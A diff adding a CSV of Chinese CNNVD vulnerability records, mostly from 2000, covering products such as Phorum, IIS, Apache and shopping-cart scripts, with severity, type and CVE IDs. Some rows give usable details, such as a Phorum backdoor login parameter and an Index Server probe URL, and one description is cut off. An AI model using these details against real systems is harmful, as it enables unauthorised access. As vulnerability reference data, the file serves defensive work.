@@ -1,0 +1,1035 @@
+Name,Vuln ID,Published,Modified,Severity,Vuln Type,Vuln Descript,CVE ID
+Solstice Backup 安全漏洞,CNNVD-200001-003,2000-01-01,2022-08-18,低危,其他,Solstice Backup 存在安全漏洞。本地用户可以利用该漏洞恢复敏感文件。,CVE-2000-0069
+Phorum violation.php3转发任意邮件漏洞,CNNVD-200012-204,2000-01-01,2005-10-20,中危,授权问题,Phorum是Phorum团队开发的一套基于PHP和MySQL的开源论坛应用程序。 Phorum存在一个漏洞允许远程用户发送任意邮件，而且不需要任何验证。 violation.php3处理URL的参数，通过主机的MTA给Mod参数指定的email发送邮件，不过要记住的是，这封电子邮件会包含攻击者的IP(或代理服务器IP)和FQDN。恶意用户可能利用这个漏洞发送垃圾邮件或邮件炸弹等行径，可能让WEB主机的IP被加入垃圾邮件服务器的黑名单。,CVE-2000-1234
+Allaire Spectra 1.0 invoke.cfm未授权RAS访问漏洞,CNNVD-200001-001,2000-01-01,2005-05-02,高危,授权问题,Allaire Spectra 1.0版本中的远程访问服务invoke.cfm模板存在漏洞。用户借助bAuthenticated参数可以绕过认证。,CVE-2000-0120
+libc FreeBSD缓冲区溢出漏洞,CNNVD-200001-002,2000-01-01,2006-11-16,高危,授权问题,libc模块中FreeBSD setlocale存在缓冲区溢出漏洞。攻击者可以借助超长的PATH_LOCALE环境变量执行任意代码。,CVE-1999-0964
+HP-UX Aserver PATH漏洞,CNNVD-200001-004,2000-01-02,2009-03-04,高危,授权问题,1999六月版本的HP-UX aserver程序存在漏洞。本地用户可以通过指定一个备用PATH来提升特权，aserver用该PATH寻找awk命令。,CVE-2000-0078
+HP-UX Aserver PATH漏洞,CNNVD-200001-005,2000-01-02,2009-03-04,高危,授权问题,1998十月版本的HP-UX aserver程序存在漏洞。本地用户可以通过指定一个备用PATH来提升特权，aserver用该PATH寻找aps和grep命令。,CVE-2000-0077
+WebTV电子邮件客户端漏洞,CNNVD-200001-006,2000-01-02,2005-10-20,低危,授权问题,WebTV电子邮件客户端存在漏洞。远程攻击者可以借助HTML强制客户端发送没有用户知识的电子邮件。,CVE-2000-0082
+Allaire Spectra 1.0 Webtop漏洞,CNNVD-200001-015,2000-01-04,2005-07-27,中危,授权问题,The Allaire Spectra Webtop存在漏洞。未授权的用户可以通过指定明确的URL访问其他的Webtop部分。,CVE-2000-0050
+KDE K-Mail特权提升漏洞,CNNVD-200001-012,2000-01-04,2005-10-21,中危,授权问题,KDE K-Mail存在漏洞。本地用户可以借助临时用户目录中的符号链接攻击提升特权。,CVE-1999-0735
+Netscape Enterprise Server 和 FastTrask Server缓冲区溢出漏洞,CNNVD-200001-016,2000-01-04,2005-05-02,超危,授权问题,Netscape Enterprise Server和FastTrask Server存在缓冲区溢出漏洞。远程攻击者可以超长HTTP GET请求提升特权。,CVE-1999-0744
+PHP3 'safe_mode'失效漏洞,CNNVD-200001-007,2000-01-04,2005-10-20,超危,授权问题,含有安全模式的PHP3无法正确地从相关函数执行的命令中过滤shell元字符。远程攻击者可以利用此漏洞执行命令。,CVE-2000-0059
+多个Linux供应商userhelper/PAM路径漏洞,CNNVD-200001-018,2000-01-04,2005-05-02,高危,授权问题,Red Hat usermode包中的userhelper程序存在漏洞。本地用户可以借助PAM和..(点 点)攻击提升根访问权。,CVE-2000-0052
+Red Hat Linux screen program 安全漏洞,CNNVD-200312-511,2000-01-04,2022-08-18,超危,其他,Red Hat Linux screen program是美国红帽（Red Hat）公司发布的一套用于在多个进程之间多路复用一个物理终端的窗口管理器程序。 Red Hat Linux screen program中存在安全漏洞，该漏洞源于程序没有使用Unix98终端。本地攻击者可利用该漏洞写入其他终端。,CVE-1999-0894
+Allaire ColdFusion 4.0x CFCACHE功能泄露信息漏洞,CNNVD-200001-014,2000-01-04,2005-05-02,高危,授权问题,Allaire ColdFusion是一个用来增强Web交互功能的组件。 ColdFusion 4.x包含一个叫做CFCACHE的功能，它通过储存HTML处理CFM页的输出来提高服务器的性能。 当CFCACHE标签处理CFM页面时，它创建一些临时文件，其中一些文件是.tmp文件，其中包含了当前的HTML输出。同时它也创建一个名为cfcache.map的文件，其中包含了到.tmp文件的指针，内容有绝对路径、时间信息和其他URL信息。这些信息如果暴露出来可以造成潜在的危害。 这些文件都放在同一个目录，并且可以通过外部的URL进行远程访问。,CVE-2000-0057
+Winamp Playlist漏洞,CNNVD-200001-008,2000-01-04,2005-10-20,高危,授权问题,Winamp客户端存在缓冲区溢出漏洞。远程攻击者可以借助.pls文件中的超长入口执行命令。,CVE-2000-0049
+Zope DTML编辑漏洞,CNNVD-200001-011,2000-01-04,2005-05-02,超危,授权问题,Z Object Publishing Environment(Zope)中DTML执行存在漏洞。远程攻击者可以利用此漏洞控制未授权的活动。,CVE-2000-0062
+Microsoft Internet Explorer 缓冲区错误漏洞,CNNVD-200001-010,2000-01-04,2021-07-26,低危,缓冲区错误,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer 4.0版本借助EMBED标签存在缓冲区错误漏洞。,CVE-1999-0876
+Allaire Spectra数据索引DoS漏洞,CNNVD-200001-009,2000-01-04,2005-05-02,低危,授权问题,Allaire Spectra Configuration Wizard存在漏洞。远程攻击者可以借助URL反复提交索引数据采集导致拒绝服务。,CVE-2000-0051
+Hotmail代码执行漏洞,CNNVD-200001-013,2000-01-04,2022-08-18,高危,其他,Hotmail存在安全漏洞，该漏洞源于Hotmail不能从用户的邮箱中正确过滤JavaScript代码。远程攻击者可以借助IMG标签中的LOWSRC或DYNRC参数执行代码。,CVE-2000-0085
+Microsoft CIS IMAP缓冲区溢出漏洞,CNNVD-200001-017,2000-01-04,2005-05-02,中危,授权问题,Microsoft Commercial Internet System (MCIS) IMAP服务器存在漏洞。远程攻击者可以借助畸形的IMAP请求导致拒绝服务。,CVE-2000-0053
+Handspring Visor Network HotSync漏洞,CNNVD-200001-020,2000-01-05,2005-10-20,低危,授权问题,Handspring Visor中的Network HotSync程序没有认证。远程攻击者可以利用此漏洞恢复电子邮件和文件。,CVE-2000-0058
+IMail IMonitor status.cgi DoS漏洞,CNNVD-200001-019,2000-01-05,2005-05-02,低危,授权问题,IMail IMONITOR status.cgi CGI脚本存在漏洞。远程攻击者可以利用此漏洞导致含有status.cgi调用的拒绝服务。,CVE-2000-0056
+Phorum 3.0.7 auth.php3验证模块存在后门漏洞,CNNVD-200012-205,2000-01-06,2005-10-20,低危,授权问题,"Phorum是Phorum团队开发的一套基于PHP和MySQL的开源论坛应用程序。 Phorum的auth.php3是其它文件的访问控制模块，auth.php3存在一个通用口令，远程攻击者只需在URL里加上PHP_AUTH_USER=boogieman就可以使用""boogieman""通过auth.php3的验证访问受保护的文件。 远程攻击者可以利用这个漏洞获得对Phorum的控制，并且可以结合Phorum的其它漏洞访问系统的本地文件。",CVE-2000-1230
+Phorum admin.php3无需验证修改管理员口令漏洞,CNNVD-200012-199,2000-01-06,2005-10-20,低危,授权问题,"Phorum是Phorum团队开发的一套基于PHP和MySQL的开源论坛应用程序。 Phorum存在一个问题，远程攻击者可以访问本地系统文件。 admin.php3脚本用于安全和管理被创建的论坛。它带有口令保护，但存在漏洞可以无需访问权限修改管理员口令。一旦拥有了管理功能的访问权限，就可以进入""Master Setting""功能，在""default .langfile name""输入框输入想要访问的系统本地文件，重新载入admin.php3页面后就可以浏览这个文件的内容了。",CVE-2000-1228
+WarFTPd多个Macro漏洞,CNNVD-200001-023,2000-01-06,2005-05-02,超危,授权问题,War FTP 1.70版本和 1.67b2版本中Macros存在漏洞。本地和远程攻击者利用此漏洞可以读取任意文件或执行命令。,CVE-2000-0044
+Solaris chkperm缓冲区溢出漏洞,CNNVD-200001-022,2000-01-06,2005-10-20,高危,授权问题,Solaris chkperm命令存在缓冲区溢出漏洞。本地用户可以借助超长-n选项提升根权限。,CVE-2000-0055
+CuteFTP 安全漏洞,CNNVD-200001-021,2000-01-06,2022-08-18,低危,其他,CuteFTP 存在安全漏洞，该漏洞源于使用弱加密存贮tree.dat文件中的密码信息。,CVE-2000-0084
+Apache 安全漏洞,CNNVD-200210-252,2000-01-07,2021-06-07,低危,其他,Apache是一款开放源代码WEB服务程序。Apache中存在信息泄漏漏洞，起因是对CGI脚本执行了不充分的检查。仅在对文件夹启用了WebDAV和CGI的情况下才会出现这个漏洞。攻击者可以通过向CGI脚本发送POST请求来利用这个漏洞。由于WebDAV和CGI脚本之间不正确的交互，可能导致Web server向远程攻击者返回CGI脚本的内容。,CVE-2002-1156
+Microsoft Internet Explorer 安全漏洞,CNNVD-200001-024,2000-01-07,2021-07-26,超危,其他,Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 5无法修改正在加载到一个窗口的安全区，直到加载完成。当文件正在加载时，远程攻击者利用此漏洞可以在不同的安全环境中执行Javascript。,CVE-2000-0061
+Linux lpr line printer daemon特权提升漏洞。,CNNVD-200001-025,2000-01-08,2005-10-20,超危,授权问题,多个Linux操作系统lpr包中的line printer daemon (lpd)存在漏洞。本地用户通过发送邮件执行任意命令行参数提升根特权，已经证明的如使用-C选项指定配置文件。,CVE-2000-1220
+多个供应商lpd漏洞,CNNVD-200001-026,2000-01-08,2009-02-28,超危,授权问题,多个Linux操作系统lpr包中的line printer daemon (lpd)通过对比本地机器的反向解析主机名和由gethostname返回的打印服务器的主机名进行认证。远程攻击者通过修改攻击IP的DNS绕过预定的访问控制。,CVE-2000-1221
+Microsoft Hotmail 安全漏洞,CNNVD-200312-510,2000-01-10,2022-08-18,超危,其他,Microsoft Hotmail存在安全漏洞，该漏洞源于无法正确过滤用户邮箱中的JavaScript代码。远程攻击者利用该漏洞通过使用十六进制代码来指定javascript: protocol来执行代码。,CVE-2000-0081
+ICQ URL远程缓冲区溢出漏洞,CNNVD-200001-028,2000-01-10,2005-10-20,高危,授权问题,ICQ 99b 1.1.1.1版本的客户端存在缓冲区溢出漏洞。远程攻击者可以借助ICQ消息中一个畸形的URL执行命令。,CVE-2000-0046
+AIX techlibss符号链接漏洞,CNNVD-200001-027,2000-01-10,2005-05-02,低危,其他,AIX techlibss存在漏洞。本地用户可以借助符号链接攻击覆盖文件。,CVE-2000-0080
+CyberCash Merchant Connection Kit 安全漏洞,CNNVD-200001-030,2000-01-11,2022-08-18,低危,其他,CyberCash Merchant Connection Kit (MCK)存在安全漏洞。本地用户可以借助符号链接攻击修改文件。,CVE-2000-0067
+Oracle MySQL 安全漏洞,CNNVD-200001-029,2000-01-11,2019-10-25,中危,其他,Oracle MySQL是美国甲骨文（Oracle）公司的一套开源的关系数据库管理系统。 Oracle MySQL中存在安全漏洞。本地攻击者可借助GRANT特权利用该漏洞修改任意MySQL用户的密码。,CVE-2000-0045
+IIS 4.0权限许可和访问控制漏洞,CNNVD-200001-032,2000-01-11,2005-10-20,中危,授权问题,IIS 4.0版本存在漏洞。远程攻击者可以通过.ida和.idq扩展要求不存在的文件获得文件根目录的真实路径名。,CVE-2000-0071
+PowerScripts PlusMail WebConsole 安全漏洞,CNNVD-200001-031,2000-01-11,2022-08-18,高危,其他,PowerScripts PlusMail CGI程序存在安全漏洞。远程攻击者可以借助一含有不正确许可的密码文件执行命令。,CVE-2000-0074
+Corel Linux get_it路径漏洞,CNNVD-200001-033,2000-01-12,2005-05-02,高危,其他,Corel Linux Update中get_it程序存在漏洞。本地用户可以通过指定备用cp程序提升根访问权。,CVE-2000-0048
+NT LPC特权提升漏洞,CNNVD-200001-034,2000-01-12,2006-04-19,高危,授权问题,"Windows NT 4.0版本中NtImpersonateClientOfPort本地进程调用存在漏洞。本地用户可以利用此漏洞提升特权，又称为""Spoofed LPC Port Request.""",CVE-2000-0070
+Netscape CommunicatorNetscape Mail Notification 信息泄漏漏洞,CNNVD-200001-035,2000-01-12,2005-05-02,低危,授权问题,"Netscape Communicator中Netscape Mail Notification (nsnotify)工具使用没有SSL的IMAP,即使用户为Communicator预先设定使用SSL连接。远程攻击者可以利用此漏洞察觉明文中的用户名和密码。",CVE-2000-0087
+Netscape Navigator加密问题漏洞,CNNVD-200001-036,2000-01-12,2005-10-20,中危,授权问题,Netscape Navigator使用弱加密存储了用户的Netscape邮件密码。,CVE-1999-1002
+MsgCore/NT拒绝服务漏洞,CNNVD-200001-038,2000-01-13,2006-09-21,低危,授权问题,"Super Mail Transfer Package (SMTP),后来称为MsgCore,存在内存漏洞。远程攻击者通过在相同会话中重复多个HELO, MAIL FROM, RCPT TO, 和DATA命令引起拒绝服务。",CVE-2000-0075
+Website Professional目录泄露漏洞,CNNVD-200001-037,2000-01-13,2006-09-22,低危,授权问题,WebSite Pro存在漏洞。远程攻击者可以借助畸形的URL请求确定web目录的真正路径名。,CVE-2000-0066
+Nortel Contivity交换机远程拒绝服务攻击和文件泄露漏洞,CNNVD-200001-041,2000-01-17,2006-08-30,低危,其他,"Contivity系列是Nortel公司开发的外网交换机产品。较新发布的Contivity交换机包含一个运行在VxWorks操作系统之上的httpd服务器用于提供远程基于Web的管理接口。 Contivity系列交换机Web管理接口的""cgiproc""脚本实现上存在漏洞，远程攻击者可能利用此漏洞对交换机进行拒绝服务攻击或查看任意系统文件。 因为没有对用户输入进行充分过滤，如果向cgiporc程序传递元字符，如""!""或""$""，系统就会崩溃。cgiproc的另一个漏洞是当请求管理页面时缺乏身份认证。这使攻击者能够查看Web服务器中的任何文件。",CVE-2000-0064
+InetServ 安全漏洞,CNNVD-200001-043,2000-01-17,2022-08-18,超危,其他,InetServ 3.0版本存在安全漏洞。远程攻击者可以借助超长请求执行命令。,CVE-2000-0065
+Vcasel文件名信任漏洞,CNNVD-200001-042,2000-01-17,2005-05-02,中危,授权问题,Visual Casel (Vcasel)无法从正在执行的文件中正确阻止用户。本地用户利用此漏洞可以使用相关的路径名指定一个名称被许可的备用文件，并且有可能提升特权。,CVE-2000-0072
+Vmware符号链接漏洞,CNNVD-200001-040,2000-01-17,2005-05-02,低危,其他,VMWare 1.1.2版本存在漏洞。本地用户可以借助符号链接攻击引发拒绝服务。,CVE-2000-0090
+Nortel Contivity交换机远程拒绝服务攻击和文件泄露漏洞,CNNVD-200001-039,2000-01-17,2006-08-30,低危,其他,"Contivity系列是Nortel公司开发的外网交换机产品。较新发布的Contivity交换机包含一个运行在VxWorks操作系统之上的httpd服务器用于提供远程基于Web的管理接口。 Contivity系列交换机Web管理接口的""cgiproc""脚本实现上存在漏洞，远程攻击者可能利用此漏洞对交换机进行拒绝服务攻击或查看任意系统文件。 因为没有对用户输入进行充分过滤，如果向cgiporc程序传递元字符，如""!""或""$""，系统就会崩溃。cgiproc的另一个漏洞是当请求管理页面时缺乏身份认证。这使攻击者能够查看Web服务器中的任何文件。",CVE-2000-0063
+VirtualVault访问控制漏洞,CNNVD-200001-046,2000-01-18,2005-05-02,超危,授权问题,含有PHSS_17692 patch的HP VirtualVault存在漏洞。非特权进程借助Trusted Gateway Proxy (TGP)可以绕过访问限制。,CVE-1999-0992
+W3C httpd (Formerly 'CERN httpd')路径泄露漏洞,CNNVD-200001-047,2000-01-18,2006-08-31,高危,授权问题,W3C CERN httpd HTTP服务器存在漏洞。远程攻击者借助不存在的URL请求确定真正路径名。,CVE-2000-0079
+Netopia Timbuktu明文传送用户名/口令漏洞,CNNVD-200001-045,2000-01-18,2005-10-20,低危,授权问题,Netopia Timbuktu Pro是一个运行于Microsoft Windows NT平台下的远程管理软件。 Timbuktu Pro设计上存在缺陷，远程攻击者可能利用此漏洞获得登录的用户名和口令。 当用户从所在Windows NT机器登录到其他机器时，Timbuktu Pro使用明文用户名/口令进行登录验证，能嗅探本地网络的攻击者可以使用sniffer轻易的收集用户名/口令，导致攻击者可能完全控制目标系统。,CVE-2000-0086
+UnixWare ppptalk缓冲区溢出漏洞,CNNVD-200001-044,2000-01-18,2005-10-21,高危,授权问题,UnixWare ppptalk命令存在缓冲区溢出漏洞。本地用户可以借助prompt参数提升特权。,CVE-2000-0099
+多个供应商lpd漏洞BSD make /tmp竞争条件漏洞,CNNVD-200001-048,2000-01-19,2005-05-02,低危,授权问题,BSD make程序存在漏洞。当-j选项使用时，本地用户可以借助符号链接攻击修改文件。,CVE-2000-0092
+Microsoft East Asian Word转换漏洞,CNNVD-200001-050,2000-01-20,2005-10-12,高危,授权问题,"Word 5中日语，韩语，中文的转换工具存在缓冲区溢出漏洞。攻击者利用此漏洞可以执行命令，又称为""Malformed Conversion Data""漏洞。",CVE-2000-0088
+Microsoft Windows NT 安全漏洞,CNNVD-200001-049,2000-01-20,2022-08-18,低危,其他,Microsoft Windows是美国微软（Microsoft）公司的一种桌面操作系统。 Windows NT 存在安全漏洞，该漏洞源于系统在关机过程中不会清除系统页面文件，由此可能导致敏感信息被记录。,CVE-1999-0595
+Inter7 vpopmail (vchkpw)缓冲区溢出漏洞,CNNVD-200001-052,2000-01-21,2005-05-02,超危,授权问题,vchkpw/vpopmail POP认证包存在缓冲区溢出漏洞。远程攻击者借助超长用户名或密码可以提升根特权。,CVE-2000-0091
+Microsoft Windows Internet Information Services 安全漏洞,CNNVD-200001-051,2000-01-21,2022-08-18,中危,其他,Microsoft Windows Internet Information Services（IIS）是美国微软（Microsoft）公司的一款适用于Windows Server平台的Web服务器。 Microsoft Windows Internet Information Services 存在安全漏洞。本地用户可以借助ASP页面中Visual Basic脚本的无效的正则表达式引发拒绝服务。,CVE-2000-0115
+Red Hat 安全漏洞,CNNVD-200001-053,2000-01-21,2022-08-18,超危,其他,Red Hat 存在安全漏洞，该漏洞源于Red Hat的安装过程使用DES密码进行加密，此加密方式用crypt()作为初始密码，而不是md5。,CVE-2000-0093
+HP Path MTU Discovery DoS 漏洞,CNNVD-200001-054,2000-01-24,2005-05-02,低危,授权问题,HP-UX 10.30版本和11.00版本中用于确定最佳的MTU的PMTU discovery进程产生了大量小流量数据包。远程攻击者利用此漏洞导致系统成为包放大器。,CVE-2000-0095
+Qualcomm qpopper 'LIST'缓冲区溢出漏洞,CNNVD-200001-055,2000-01-26,2005-10-20,高危,授权问题,qpopper 3.0测试版存在缓冲区溢出漏洞。本地用户借助超长LIST命令提升特权。,CVE-2000-0096
+Microsoft Windows Internet Information Services Sample Internet Data Query (IDQ) 安全漏洞,CNNVD-200001-058,2000-01-26,2022-08-18,低危,其他,Microsoft Windows Internet Information Services（IIS）是美国微软（Microsoft）公司的一款适用于Windows Server平台的Web服务器。 Microsoft Windows IIS 3 和IIS 4中样板Internet Data Query (IDQ)脚本存在安全漏洞。远程攻击者可以借助..（点 点）攻击读取文件。,CVE-2000-0126
+Microsoft索引服务器信息泄漏漏洞,CNNVD-200001-057,2000-01-26,2005-05-02,低危,授权问题,Microsoft索引服务器存在漏洞。远程攻击者借助不存在的Internet Data Query文件可以确定web目录的真正路径名。,CVE-2000-0098
+Microsoft Windows Index Server远程目录遍历漏洞(MS00-006),CNNVD-200001-056,2000-01-26,2005-10-12,中危,授权问题,"Microsoft Index Server是Windows NT 4.0可选安装包中包括的一个基于Web的搜索引擎，在Windows 2000系统中作为一个服务安装。 Internet Information Server 4.0中一个ISAPI应用程序webhits.dll存在安全漏洞，允许攻击者突破WEB的虚拟文件系统，获得对在同一个逻辑驱动器中其它文件(如用户数据库、日志文件等任何能猜测路径名和文件名的文件)的非法访问。 Webhits.dll动态链接库与.htw文件关联。但即使在系统中没有任何.htw文件，仍然可能有问题。检查系统是否存在这个安全问题的是输入：http://your_web_server_address/nosuchfile.htw，如果返回信息类似""format of the QUERY_STRING is invalid""，那么就说明存在安全问题。",CVE-2000-0097
+SyGate非认证远程管理漏洞,CNNVD-200001-061,2000-01-27,2005-05-02,高危,配置错误,SyGate远程管理程序无法对管理服务正确限制访问。远程攻击者利用此漏洞可以导致拒绝服务或访问流量统计。,CVE-2000-0113
+SCO scohelp文件执行漏洞,CNNVD-200001-059,2000-01-27,2005-05-02,高危,授权问题,SCO scohelp程序存在缓冲区溢出漏洞。远程攻击者利用此漏洞可以执行文件。,CVE-2000-0130
+IBM AIX 4.3.0 portmir 缓冲区错误漏洞,CNNVD-200001-060,2000-01-27,2020-12-10,高危,缓冲区错误,AIX 4.3.0版本中portmir存在缓冲区溢出漏洞。本地攻击者借助echo_error程序破坏锁文件并提升根特权。,CVE-2000-1216
+Check Point Firewall-1脚本标签检查绕过漏洞,CNNVD-200001-062,2000-01-29,2006-04-07,高危,其他,Firewall-1无法正确过滤脚本标签。远程攻击者通过在SCRIPT标签前包含额外的,CVE-2000-0116
+Rightfax Web客户端可预见会话数字漏洞,CNNVD-200001-063,2000-01-29,2005-05-02,高危,授权问题,The RightFax web客户端使用可预见的会话数字。远程攻击者利用此漏洞可以劫持用户的会话。,CVE-2000-0111
+Cobalt RaQ siteUserMod.cgi特权提升漏洞,CNNVD-200001-064,2000-01-30,2006-08-28,低危,授权问题,Cobalt RaQ2服务器中siteUserMod.cgi程序存在漏洞。任何网站管理员可以利用此漏洞修改其他用户，网站管理员和管理（root）的密码。,CVE-2000-0117
+Standard & Poor's ComStock机器漏洞,CNNVD-200001-065,2000-01-31,2005-10-20,超危,授权问题,Standard和Poor's ComStock中mcsp Client Site Processor系统(MultiCSP)存在漏洞。安装时有多个账户，其中一些没有密码，一些是容易猜测的默认密码。,CVE-2000-0109
+Microsoft Java虚拟机getSystemResource漏洞,CNNVD-200001-066,2000-01-31,2007-11-09,低危,信息泄露,Microsoft Java虚拟机存在漏洞。远程攻击者借助getSystemResourceAsStream函数可以读取文件。,CVE-2000-0132
+SmartCart 安全漏洞,CNNVD-200002-011,2000-02-01,2022-08-18,高危,其他,SmartCart 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0103
+CartIt 安全漏洞,CNNVD-200002-009,2000-02-01,2022-08-18,高危,其他,CartIt 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0137
+MS Outlook Express 5 Javascript电子邮件访问漏洞,CNNVD-200002-003,2000-02-01,2005-10-20,低危,授权问题,Outlook Express 5.01 版本和Internet Explorer 5.01版本存在漏洞。远程攻击者借助访问变量的脚本查看用户的电子邮件信息，此变量引用客户端已读取的后续的电子邮件消息。,CVE-2000-0105
+Tiny FTPd多个缓冲区溢出漏洞,CNNVD-200002-005,2000-02-01,2005-10-20,超危,授权问题,"Tiny FTPd 0.52 测试版3 FTP服务器存在缓冲区溢出漏洞。用户可以借助STOR, RNTO, MKD, XMKD, RMD, XRMD, APPE, SIZE,和 RNFR命令执行命令。",CVE-2000-0133
+NT 回收站与创建文件夹漏洞,CNNVD-200002-004,2000-02-01,2006-04-19,低危,其他,Windows NT和Windows 2000中Recycle Bin工具存在漏洞。本地用户通过在回收目录中创建含有受害人SID的子目录可以读取或修改文件。,CVE-2000-0121
+Make-a-Store OrderPage 安全漏洞,CNNVD-200002-017,2000-02-01,2022-08-18,高危,其他,Make-a-Store OrderPage 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0101
+GNU make /tmp漏洞,CNNVD-200002-002,2000-02-01,2005-10-20,中危,授权问题,从标准输入读取Makefile时，GNU make跟随符号链接。其他本地用户利用此漏洞可以执行命令。,CVE-2000-0151
+Apache printenv 跨站脚本漏洞,CNNVD-200002-010,2000-02-01,2021-06-07,低危,跨站脚本,"Apache是开放源代码广泛使用的WEB服务程序。Apache包含的'printenv'脚本对用户输入请求缺少正确过滤，远程攻击者可以利用这个漏洞进行跨站脚本攻击，获得目标用户敏感信息。'printenv'是位于""/cgi-bin/""目录下的测试CGI脚本，可以打印环境变量信息。脚本对用户的WEB请求缺少过滤，构建带有恶意HTML代码的链接，诱使用户点击，可导致脚本代码在目标用户浏览器上执行，可以造成基于Cookie认证的敏感信息泄露或进行其他非法活动。",CVE-2000-1205
+Filemaker 安全漏洞,CNNVD-200002-007,2000-02-01,2022-08-18,高危,其他,Filemaker提供的购物车应用程序存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0123
+EasyCart 安全漏洞,CNNVD-200002-016,2000-02-01,2022-08-18,高危,其他,EasyCart 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0106
+War-FTPd 1.6x CWD/MKD DoS漏洞,CNNVD-200002-013,2000-02-01,2005-05-02,低危,授权问题,War FTPd 1.6x版本存在缓冲区溢出漏洞。用户借助超长MKD和CWD命令可以导致拒绝服务。,CVE-2000-0131
+Shoptron 安全漏洞,CNNVD-200002-012,2000-02-01,2022-08-18,高危,其他,Shoptron 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0104
+Debian GNU/Linux 2.1 apcd符号链接漏洞,CNNVD-200002-001,2000-02-01,2005-05-02,高危,授权问题,Linux apcd程序存在漏洞。本地攻击者可以借助符号链接攻击修改任意文件。,CVE-2000-0107
+Intellivend 安全漏洞,CNNVD-200002-006,2000-02-01,2022-08-18,高危,其他,Intellivend 购物车应用程序存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0108
+Retail 安全漏洞,CNNVD-200002-008,2000-02-01,2022-08-18,高危,其他,Retail购物车应用程序存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0135
+Check It Out 安全漏洞,CNNVD-200002-020,2000-02-01,2022-08-18,高危,其他,Check It Out购物车应用程序存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0134
+Cart32 安全漏洞,CNNVD-200002-019,2000-02-01,2022-08-18,高危,其他,Cart32 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0136
+WebSiteTool 安全漏洞,CNNVD-200002-015,2000-02-01,2022-08-18,高危,其他,WebSiteTool存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0110
+SalesCart 安全漏洞,CNNVD-200002-018,2000-02-01,2022-08-18,高危,其他,SalesCart 存在安全漏洞。远程用户借助隐藏表单域可以修改敏感采购信息。,CVE-2000-0102
+NetBSD跟踪进程(2)漏洞,CNNVD-200002-014,2000-02-01,2005-05-02,高危,其他,NetBSD VAX上的跟踪进程存在漏洞。本地用户可以通过修改调试进程中的PSL内容提升特权。,CVE-2000-0157
+Extropia WebBanner输入验证漏洞,CNNVD-200002-022,2000-02-02,2005-07-27,中危,授权问题,Selena Sol WebBanner 4.0版本存在漏洞。远程攻击者借助..(点 点)攻击可以读取任意文件。,CVE-2000-0469
+Frontpage Server Extensions 安全漏洞,CNNVD-200002-023,2000-02-02,2022-08-18,低危,其他,Frontpage Server Extensions存在安全漏洞。远程攻击者借助/_vti_bin/ 中shtml.dll的RPC POST请求确定匿名账户的名称。,CVE-2000-0114
+Debian GNU/Linux MBR漏洞,CNNVD-200002-021,2000-02-02,2006-11-16,高危,配置错误,Debian GNU/Linux的默认安装使用了不安全的Master Boot Record (MBR)。本地用户可以利用此漏洞在安装过程中从软盘启动。,CVE-2000-0112
+Linux权限提升漏洞,CNNVD-200002-028,2000-02-03,2005-05-02,高危,授权问题,Linux安装和卸载中存在缓冲区溢出漏洞。本地用户借助超长相关路径名可以提升根特权。,CVE-2000-0218
+Webspeed wsisa.dll匿名用户可取得管理权漏洞,CNNVD-200002-025,2000-02-03,2006-11-16,高危,授权问题,"Webspeed是一种Web网站创作语言，它支持多种基于Web网站的大型数据库。 Webspeed Version 3中包含了一个Java GUI配置程序，其中的wsisa.dll存在一个安全问题。 在这个GUI配置程序的""messenger""部份中有一个选项用于关闭对WSMadmin工具的访问。但打开或关闭该选项实际上并无任何区别。要关闭这个访问功能必须手工编辑ubroker.properties文件。远程入侵者可以使用该漏洞控制网站。 <**>",CVE-2000-0127
+MS Frontpage htimage.exe路径泄露漏洞,CNNVD-200002-024,2000-02-03,2005-10-20,低危,授权问题,Frontpage Server Extensions存在漏洞。远程攻击者借助htimage.exe CGI程序的GET请求可以确定虚拟目录的物理路径。,CVE-2000-0122
+SurfControl SuperScout内容过滤绕过漏洞,CNNVD-200002-026,2000-02-03,2005-10-20,低危,授权问题,SurfCONTROL SuperScout不能通过末端的.(点)正确指定网站的类别。用户利用此漏洞可以绕过网站访问权限。,CVE-2000-0124
+WWWThreads SQL命令输入漏洞,CNNVD-200002-027,2000-02-03,2006-08-07,高危,授权问题,wwwthreads无法正确清洗传递给SQL查询的数字数据或表的名称。远程攻击者利用此漏洞可以提升wwwthreads论坛的特权。,CVE-2000-0125
+Finger Server命令执行漏洞,CNNVD-200002-029,2000-02-04,2005-05-02,超危,授权问题,The Finger Server 0.82版本存在漏洞。远程攻击者可以借助shell元变量执行命令。,CVE-2000-0128
+Serv-U FTP Server 安全漏洞,CNNVD-200002-031,2000-02-04,2022-08-18,低危,其他,SolarWinds Serv-U FTP Server是美国SolarWinds公司的一套FTP和MFT文件传输软件。 Serv-U FTP服务器的SHGetPathFromIDList函数存在安全漏洞。攻击者借助运行malformed .lnk文件的LIST命令可以导致拒绝服务。,CVE-2000-0129
+Registry Enumeration File枚举注册表文件漏洞,CNNVD-200002-030,2000-02-04,2006-04-19,低危,授权问题,"Microsoft Terminal服务器版本和Windows NT 4.0版本中的rdisk工具在有权限的临时文件中存储了注册表配置信息。本地用户利用此漏洞可以读取这些信息，又称为""RDISK Registry Enumeration File""漏洞。",CVE-2000-0089
+Debian GNU/Linux gnucash libguile.so library 安全漏洞,CNNVD-200002-032,2000-02-05,2022-08-18,中危,其他,Debian GNU/Linux gnucash libguile.so library 文件存在安全漏洞。安装时用了全局可写的权限。,CVE-2000-0145
